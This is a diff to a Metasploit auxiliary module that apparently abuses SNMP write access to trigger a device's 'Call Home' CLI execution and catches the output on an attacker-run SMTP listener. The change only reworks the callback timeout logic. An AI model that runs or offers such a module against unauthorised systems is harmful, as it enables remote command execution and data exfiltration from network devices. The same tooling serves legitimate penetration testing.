@@ -330,13 +330,18 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def trigger_callhome_command
+    @callback_deadline = Process.clock_gettime(Process::CLOCK_MONOTONIC) + datastore['CALLBACK_TIMEOUT']
+
     set_varbinds('Trigger Call Home CLI execution', [integer_varbind(CLI_TRIGGER_OID, TRUTH_VALUE_TRUE)])
     trigger = read_oid(CLI_TRIGGER_OID)
+
     fail_with(Msf::Module::Failure::UnexpectedReply, 'Call Home trigger did not return to false') if exception_value?(trigger) || trigger.to_i != TRUTH_VALUE_FALSE
+
     print_status("Waiting up to #{datastore['CALLBACK_TIMEOUT']} seconds for CLI output")
   end
 
   def start_smtp_receiver
+    @callback_deadline = nil
     @smtp_queue = Queue.new
     @smtp_server = Rex::Socket::TcpServer.create(
       'LocalHost' => srvhost,
@@ -358,24 +363,37 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def receive_matching_smtp_message
-    deadline = Process.clock_gettime(Process::CLOCK_MONOTONIC) + datastore['CALLBACK_TIMEOUT']
-    while (remaining = deadline - Process.clock_gettime(Process::CLOCK_MONOTONIC)).positive?
-      ready = ::IO.select([@smtp_server], nil, nil, remaining)
-      break unless ready
+    loop do
+      deadline = @callback_deadline
+
+      if deadline
+        remaining = deadline - Process.clock_gettime(Process::CLOCK_MONOTONIC)
+        break unless remaining.positive?
+      else
+        remaining = 1
+      end
+
+      ready = ::IO.select([@smtp_server], nil, nil, [remaining, 1].min)
+      next unless ready
 
       client = @smtp_server.accept
       add_socket(client)
+
       begin
-        message = receive_smtp_message(client, deadline)
+        connection_deadline = deadline || Process.clock_gettime(Process::CLOCK_MONOTONIC) + SMTP_CHECK_TIMEOUT
+        message = receive_smtp_message(client, connection_deadline)
+
         if message&.include?(@smtp_address)
           @smtp_queue << { message: message, peer: client.peerhost }
           return
         end
+
         vprint_warning('Discarded an SMTP message that did not contain the per-run recipient marker') if message
       ensure
         client.close
       end
     end
+
     @smtp_queue << {}
   end
 
@@ -431,7 +449,8 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def wait_for_smtp_message
-    result = poll_until_truthy(timeout: datastore['CALLBACK_TIMEOUT'] + 5) do
+    remaining = @callback_deadline - Process.clock_gettime(Process::CLOCK_MONOTONIC)
+    result = poll_until_truthy(timeout: [remaining + 5, 0].max) do
       @smtp_queue.pop(true)
     rescue ThreadError
       nil
